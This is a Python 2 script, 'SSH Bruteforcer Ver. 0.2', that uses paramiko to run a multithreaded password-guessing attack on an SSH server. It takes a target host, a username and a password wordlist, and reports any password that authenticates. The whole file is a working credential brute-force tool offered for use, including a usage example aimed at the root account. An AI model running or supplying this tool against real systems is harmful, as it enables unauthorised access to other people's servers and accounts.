import thread
import time
from threading import Thread
import sys, os,threading, time, traceback, getopt
import paramiko
import terminal

global adx
global port

adx="1"
port=22
data=[]
i=[]

term = terminal.TerminalController()
paramiko.util.log_to_file('demo.log')

print "\n*************************************"
print "*"+term.RED + "SSH Bruteforcer Ver. 0.2"+term.NORMAL+"           *"
print "*Myl4bsec.github.io                 *"
print "*************************************\n"

def usage():
    print "Usage: brutessh.py options \n"
    print "       -h: destination host\n"
    print "       -u: username to force\n"
    print "       -d: password file \n"
    print "       -t: threads (default 12, more could be bad)\n\n"
    print "Example:  brutessh.py -h 192.168.1.55 -u root -d mypasswordlist.txt \n"
    sys.exit()

class force(Thread):
	def __init__( self, name ):
		Thread.__init__(self)
		self.name = name

	def run(self):
		global adx
		if adx == "1":
			passw=self.name.split("\n")[0]
			t = paramiko.Transport(hostname)
			try:
				t.start_client()
			except Exception:
				x = 0

			try:
				t.auth_password(username=username,password=passw)
			except Exception:
				x = 0

			if t.is_authenticated():
				print term.DOWN + term.GREEN + "\nAuth OK ---> Password Found: " + passw + term.DOWN + term.NORMAL
				t.close()
				adx = "0"
			else:
				print term.BOL + term.UP + term.CLEAR_EOL + passw + term.NORMAL
				t.close()
		time.sleep(0)
		i[0]=i[0]-1


def test_thread(names):
	i.append(0)
	j=0
	while len(names):
		try:
			if i[0]<th:
				n = names.pop(0)
				i[0]=i[0]+1
				thread=force(n)
				thread.start()
				j=j+1
		except KeyboardInterrupt:
			print "Attack suspended by user..\n"
			sys.exit()
	thread.join()

def test(argv):
	global th
	global hostname
	global username
	th = 12
	if len(sys.argv) < 3:
		usage()
	try :
		opts, args = getopt.getopt(argv,"h:u:d:t:")
	except getopt.GetoptError:
		usage()
	for opt,arg in opts :
		if opt == '-u':
			username = arg
		elif opt == '-h':
			hostname =arg
		elif opt == '-d':
			password = arg
		elif opt == "-t":
			th = arg
	try:
		f = open(password, "r")
	except:
		print "Can't open password file\n"
		sys.exit()
	print term.RED + "HOST: " +term.NORMAL +  hostname + term.RED + " Username: " +term.NORMAL +  username +term.RED + " Password file: " +term.NORMAL+ password
	print "==========================================================================="
	print "Trying password...\n"
	name = f.readlines()
	starttime = time.clock()
	test_thread(name)
	stoptime = time.clock()
	print "\nTimes -- > Init: "+ str(starttime) + " End: "+str(stoptime)
	print "\n"
	
if __name__ == "__main__":
	try:
		test(sys.argv[1:])
	except KeyboardInterrupt:
		print "Attack suspended by user...\n"
		sys.exit()
